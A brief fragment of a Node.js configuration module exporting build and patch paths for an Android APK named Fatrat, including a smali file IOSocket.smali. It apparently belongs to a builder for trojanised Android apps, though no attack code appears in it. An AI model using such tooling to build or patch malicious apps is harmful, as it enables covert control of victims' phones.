...
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/Fatrat.apk')

exports.termuxApkBuildPath = exports.termux + '/fatrat/build.apk'
exports.termuxApkSignedBuildPath = exports.termux + '/fatrat/Fatrat.apk'
...
exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/evildevill/fatrat/IOSocket.smali');
